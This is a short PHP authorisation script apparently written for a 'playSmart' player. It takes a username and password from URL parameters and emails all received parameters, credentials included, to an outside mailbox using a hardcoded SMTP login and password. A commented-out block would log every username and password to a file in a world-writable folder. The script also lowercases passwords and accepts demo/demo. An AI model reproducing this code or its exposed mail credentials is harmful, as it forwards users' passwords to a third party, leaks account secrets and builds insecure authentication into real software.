<?php
// playSmart Simple Authorisation script
// Copyright by Onlinelib, GmbH
$NAME   	= $_GET['username'];
$PASS   	= $_GET['password'];

$message = "variabili ricevute da playsmart\n";
foreach ($_GET as $key=>$value){
	$message .= $key.' = '.$value.'\n';
}


require("class.phpmailer.php");
$mail = new PHPMailer();
$mail->IsSMTP();
$body = $message;
$body = str_replace('\\','',$body);
$mail->CharSet = 'UTF-8';
$mail->SetFrom('info@tutor81.com', 'Tutor81');
$mail->AddAddress("assistenza@tutor81.it");
$mail->Subject = 'Variabili da PlayerSmart';
//$mail->AltBody    = "To view the message, please use an HTML compatible email viewer!";
$mail->MsgHTML($message);
$mail->IsSMTP();
$mail->Host = 'mail.tutor81.com';
$mail->SMTPAuth = true;
$mail->Username = 'info@tutor81.com';
$mail->Password = 'luca1712';
$mail->Send();

/* enable debugger if you like
 it wrotes all username and passwords in the textfile dump.txt
notice that the script has chmod 755 and folder 777 rights so that
the script is allowed to write the dump.txt
*/
/*
 $file 		= "dump.txt";
$date		= date('l jS \of F Y h:i:s A');
$fh 		= fopen($file, 'a') or die("can't open file");
fwrite($fh, $date."\n");
fwrite($fh, "Username: ".$NAME."\n");
fwrite($fh, "Password: ".$PASS."\n");
fwrite($fh, "-\n");
fclose($file);
*/

// convert all to lowercase
$NAME = strtolower($NAME);
$PASS = strtolower($PASS);

if ($NAME == "demo" && $PASS == "demo") {

	?>
Authorized=true AccessExpirationDays=1
<?php

} else {
?>
Authorized=false
<?php
}



?>

